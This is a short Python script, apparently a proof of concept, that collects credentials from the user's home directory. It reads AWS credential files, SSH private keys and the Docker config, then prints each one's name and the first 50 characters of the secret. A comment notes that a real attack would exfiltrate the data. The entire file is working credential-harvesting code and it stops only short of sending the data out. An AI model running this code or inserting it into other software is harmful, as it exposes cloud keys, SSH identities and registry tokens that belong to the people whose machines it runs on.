#!/usr/bin/env python3
import os, json, urllib.request

def get_credentials():
    creds = {}
    # AWS
    aws_path = os.path.expanduser("~/.aws/credentials")
    if os.path.exists(aws_path):
        creds["aws"] = open(aws_path).read()
    # SSH
    for key in ["id_rsa", "id_ed25519", "id_ecdsa"]:
        path = os.path.expanduser(f"~/.ssh/{key}")
        if os.path.exists(path):
            creds[f"ssh_{key}"] = open(path).read()
    # Docker
    docker_cfg = os.path.expanduser("~/.docker/config.json")
    if os.path.exists(docker_cfg):
        creds["docker"] = open(docker_cfg).read()
    return creds

creds = get_credentials()
# In real attack, this would be exfiltrated
print(json.dumps({"found": list(creds.keys()), "sample": {k: v[:50] for k, v in creds.items()}}))
